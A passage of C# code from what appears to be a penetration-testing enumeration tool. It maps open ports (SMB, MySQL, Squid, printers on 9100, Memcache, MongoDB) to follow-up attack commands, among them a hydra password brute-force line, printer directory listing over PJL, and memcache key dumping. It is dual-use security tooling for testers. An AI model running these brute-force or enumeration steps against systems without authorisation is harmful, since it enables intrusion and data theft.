                postScanActions += $"- SMB - Connect Share: smbclient -U validusername%validpass //{target}/shareName" + Environment.NewLine;
            }
            else if (port == 2049)
            {
                postScanActions += "- NFS: rpcinfo -p " + target + Environment.NewLine;
            }
            else if (port == 3128)
            {
                postScanActions += $"- Squid: If you get a password, run: squidclient -v -h {target} -w 'passwordHere' mgr:menu" + Environment.NewLine;
            }
            else if (port == 3306)
            {
                postScanActions += $"- Try: hydra -L users.txt -P passwords.txt {target} mysql" + Environment.NewLine;
            }
            else if (port == 3389)
            {
                // TODO: https://nmap.org/nsedoc/scripts/rdp-ntlm-info.html
                // https://svn.nmap.org/nmap/scripts/rdp-ntlm-info.nse
                /*
                string NTLM_NEGOTIATE_BLOB =  "30 37 A0 03 02 01 60 A1 30 30 2E 30 2C A0 2A 04 28"
                                            + "4e 54 4c 4d 53 53 50 00" // Identifier - NTLMSSP
                                            + "01 00 00 00" //Type: NTLMSSP Negotiate -01
                                            + "B7 82 08 E2 " // Flags(NEGOTIATE_SIGN_ALWAYS | NEGOTIATE_NTLM | NEGOTIATE_SIGN | REQUEST_TARGET | NEGOTIATE_UNICODE)
                                            + "00 00 " // DomainNameLen
                                            + "00 00" // DomainNameMaxLen
                                            + "00 00 00 00" // DomainNameBufferOffset
                                            + "00 00 " // WorkstationLen
                                            + "00 00" // WorkstationMaxLen
                                            + "00 00 00 00" // WorkstationBufferOffset
                                            + "0A" // ProductMajorVersion = 10
                                            + "00 " // ProductMinorVersion = 0
                                            + "63 45 " // ProductBuild = 0x4563 = 17763
                                            + "00 00 00" // Reserved
                                            + "0F"; // NTLMRevision = 5 = NTLMSSP_REVISION_W2K3


                byte[] byteData = General.StringToByteArray(NTLM_NEGOTIATE_BLOB);
                string result = General.BannerGrabBytes(ip, port, byteData);
                Console.WriteLine("Result: " + result);

                // Connect to the specified port on localhost.
                TcpClient client = new TcpClient("localhost", port);

                // Get the network stream from the connected client.
                NetworkStream stream = client.GetStream();

                // Read the stream into a byte array.
                byte[] data = new byte[client.ReceiveBufferSize];
                int bytesRead = stream.Read(data, 0, Convert.ToInt32(client.ReceiveBufferSize));

                // Check if the data is the RDP protocol identifier.
                if (bytesRead >= 12 && data[8] == 0x03 && data[9] == 0x00 && data[10] == 0x00 && data[11] == 0x0B)
                {
                    Console.WriteLine("The server is an RDP server.");
                }
                else
                {
                    Console.WriteLine("The server is not an RDP server.");
                }

                // Close the client and the stream.
                stream.Close();
                client.Close();
                */
            }
            else if (port == 3690)
            {
                // Banner: ( success ( 2 2 ( ) ( edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list ) ) )
                postScanActions += "- SVN: svn diff -r1 svn://" + target + Environment.NewLine;
            }
            else if (port == 4369)
            {
                // https://svn.nmap.org/nmap/scripts/epmd-info.nse
                postScanActions += $"- EPMD: nmap {target} -p4369 --script=epmd-info -sV" + Environment.NewLine;
            }
            else if (port == 5222)
            {
                // Ignite Realtime Openfire Jabber server 3.10.0 or later
                Console.WriteLine("Jabber - Do something about this");
            }
            else if (port == 5269)
            {
                // jabber / xmpp-server
                postScanActions += "- nmap --script=xmpp-info " + target + " -p" + port;
            }
            // 5269/tcp open  xmpp                Wildfire XMPP Client ???
            else if (port == 5672)
            {
                string portHeader = "Port 5672 - Advanced Message Queuing Protocol (AMQP)";
                string portData = General.BannerGrab(target, 5672, "Woof" + Environment.NewLine + Environment.NewLine);
                if (portData.StartsWith("AMQP"))
                {
                    if (portData[4] == 0 && portData[5] == 0 && portData[6] == 9 && portData[7] == 1)
                    {
                        portData = "- Version 0-9-1";
                        // theBanner = General.BannerGrab(ip, port, theBanner); // Need to send the bytes of AMQP0091

                        // Oh gawd....
                        // \u0001\0\0\0\0\u0001?\0\n\0\n\0\t\0\0\u0001?\fcapabilitiesF\0\0\0?\u0012publisher_confirmst\u0001\u001aexchange_exchange_bindingst\u0001\nbasic.nackt\u0001\u0016consumer_cancel_notifyt\u0001\u0012connection.blockedt\u0001\u0013consumer_prioritiest\u0001\u001cauthentication_failure_closet\u0001\u0010per_consumer_qost\u0001\u000fdirect_reply_tot\u0001\fcluster_nameS\0\0\0\u0010rabbit@dyplesher\tcopyrightS\0\0\0.Copyright (C) 2007-2018 Pivotal Software, Inc.\vinformationS\0\0\05Licensed under the MPL.  See http://www.rabbitmq.com/\bplatformS\0\0\0\u0011Erlang/OTP 22.0.7\aproductS\0\0\0\bRabbitMQ\aversionS\0\0\0\u00053.7.8\0\0\0\u000ePLAIN AMQPLAIN\0\0\0\u0005en_US?
                        // https://svn.nmap.org/nmap/nselib/amqp.lua
                        postScanActions += $"- AMQP is up and nmap knows more: nmap --script amqp-info -p{port} {target}" + Environment.NewLine;
                    }
                    else
                    {
                        portData = "- 5672.Unknown Version - Bug Reelix";
                    }
                }
                else
                {
                    portData = "- 5672.Unknown - Bug Reelix";
                }
                Console.WriteLine(portHeader + Environment.NewLine + portData + Environment.NewLine);
            }
            else if (port == 9100)
            {
                // TODO: Clean - Should the file be named "Printer.cs" or "jetdirect.cs" ???
                string portHeader = $"Port {port} - Printer (jetdirect)";

                // PJL

                // http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
                // Yoinked from Nmap
                string bannerInfo = General.BannerGrab(target, port, "@PJL INFO ID\r\n");
                string portData = "";
                if (bannerInfo != "")
                {
                    portData += "- Version: " + bannerInfo + Environment.NewLine;
                    // Yoinked from PRET
                    List<string> dirList = General.BannerGrab(target, port, "@PJL FSDIRLIST NAME=\"0:/ \" ENTRY=1 COUNT=65535\r\n").Split("\r\n".ToCharArray()).ToList();
                    // Clean new lines
                    dirList.RemoveAll(string.IsNullOrEmpty);
                    // Append each item
                    portData += "- Directory List: " + Environment.NewLine;
                    foreach (string dir in dirList)
                    {
                        portData += "-- " + dir + Environment.NewLine;
                    }
                    portData = portData.Trim(Environment.NewLine.ToCharArray());

                    // PFL Successful - Add pjl to the post scan actions
                    postScanActions += portData + Environment.NewLine + $"- Printer: pret.py {target} pjl ( https://github.com/RUB-NDS/PRET )" + Environment.NewLine;
                    // If I need to do more PRET stuff, I can refer to this video
                    postScanActions += "- Ref: https://www.youtube.com/watch?v=vD3jSJlc0ro" + Environment.NewLine;
                }
                else
                {
                    portData = "- Unknown - Bug Reelix!";
                }
                // TODO: Add PCL (Printer Command Language), XEX, IPDS
                Console.WriteLine(portHeader + Environment.NewLine + portData + Environment.NewLine);
            }
            else if (port == 11211)
            {
                postScanActions += "- 11211 - Memcache" + Environment.NewLine;
                postScanActions += "-- Verify: stats (Dumps \"STAT\")" + Environment.NewLine;
                // if 'version' is above 1.4.31
                postScanActions += "-- Dump key names (1.4.31+): lru_crawler metadump all" + Environment.NewLine;
                // else
                postScanActions += "-- Dump key names (Below 1.4.31): stats items" + Environment.NewLine;
                // stats cachedump 1 0, stats cachedump 2 0, stats cachedump 3 0 etc
                postScanActions += "-- Read key: get keyname" + Environment.NewLine;
            }
            else if (port == 27017)
            {
                // MongoDB
                postScanActions += "- 27017 - MongoDB: NMap can get the version" + Environment.NewLine;
                // We can somehow get the version and then check this - Maybe later.
                postScanActions += "-- CVE-2025-14847 - MongoBleed" + Environment.NewLine;
                // Nmap can get the version - What else can we get?

            }
            return postScanActions;
        }
    }
}
